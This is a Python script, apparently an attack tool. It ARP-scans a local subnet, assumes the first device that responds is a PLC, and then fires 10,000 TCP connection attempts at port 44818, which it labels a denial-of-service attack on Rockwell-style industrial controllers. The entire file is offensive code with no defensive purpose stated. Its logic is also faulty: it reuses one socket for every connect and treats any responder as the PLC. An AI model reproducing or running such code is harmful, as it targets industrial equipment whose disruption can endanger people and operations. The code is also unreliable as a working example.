import os
import time
from scapy.all import ARP, Ether, srp
import socket

def discover_plc_ip():
    # Define the IP range to scan
    ip_range = "192.168.1.1/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]
    
    # Parse the response to find the PLC's IP address
    plc_ip = None
    for sent, received in result:
        plc_ip = received.psrc
        print(f"Discovered PLC at IP: {plc_ip}")
        break
    
    return plc_ip

def perform_dos_attack(plc_ip):
    # Define the number of requests to send
    num_requests = 10000
    
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Set a timeout for the socket
    sock.settimeout(1)
    
    # Perform the DoS attack
    print(f"Starting DoS attack on PLC at IP: {plc_ip}")
    for i in range(num_requests):
        try:
            # Attempt to connect to the PLC
            sock.connect((plc_ip, 44818))  # Port 44818 is commonly used by Rockwell PLCs
            print(f"Request {i+1}/{num_requests} sent to {plc_ip}")
        except:
            print(f"Failed to send request {i+1}/{num_requests} to {plc_ip}")
        time.sleep(0.1)  # Add a small delay between requests
    
    # Close the socket
    sock.close()
    print("DoS attack completed.")

if __name__ == "__main__":
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    
    if plc_ip:
        # Step 2: Perform the DoS attack
        perform_dos_attack(plc_ip)
    else:
        print("PLC IP address not found.")